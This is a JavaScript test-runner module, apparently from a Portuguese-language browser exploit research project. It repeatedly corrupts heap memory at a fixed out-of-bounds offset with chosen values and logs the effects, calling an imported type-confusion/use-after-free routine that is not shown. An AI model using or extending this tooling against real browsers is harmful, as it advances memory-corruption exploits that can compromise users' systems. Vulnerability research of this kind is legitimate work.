// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { diagnoseHeapCorruptionEffects } from './testJsonTypeConfusionUAFSpeculative.mjs'; // Nome da função importada atualizado
import { OOB_CONFIG } from '../config.mjs';
import { toHex } from '../utils.mjs';

async function runHeapCorruptionAndObserveAllocations() {
    const FNAME_RUNNER = "runHeapCorruptionAndObserveAllocations";
    logS3(`==== INICIANDO Diagnóstico de Corrupção de Heap e Efeitos em Alocações Subsequentes ====`, 'test', FNAME_RUNNER);

    // Offset problemático conhecido
    const criticalCorruptionOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    // Teste 1: Corromper com 0xFFFFFFFF
    logS3(`\n--- Testando Corrupção em ${toHex(criticalCorruptionOffset)} com valor 0xFFFFFFFF ---`, 'subtest', FNAME_RUNNER);
    await diagnoseHeapCorruptionEffects(criticalCorruptionOffset, 0xFFFFFFFF);
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Teste 2: Corromper com 0x00000000 (para comparação)
    logS3(`\n--- Testando Corrupção em ${toHex(criticalCorruptionOffset)} com valor 0x00000000 ---`, 'subtest', FNAME_RUNNER);
    await diagnoseHeapCorruptionEffects(criticalCorruptionOffset, 0x00000000);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
    // Teste 3: Corromper com 0x41414141 (outro valor comum)
    logS3(`\n--- Testando Corrupção em ${toHex(criticalCorruptionOffset)} com valor 0x41414141 ---`, 'subtest', FNAME_RUNNER);
    await diagnoseHeapCorruptionEffects(criticalCorruptionOffset, 0x41414141);

    logS3(`==== Diagnóstico de Corrupção de Heap e Efeitos em Alocações CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_HeapCorruptionEffects';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Diagnóstico de Efeitos de Corrupção de Heap em Novas Alocações ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Diagnóstico Corrupção Heap";
    
    await runHeapCorruptionAndObserveAllocations();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Diagnóstico de Efeitos de Corrupção de Heap) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else {
        document.title = "Script 3 Concluído - Diagnóstico Corrupção Heap";
    }
}
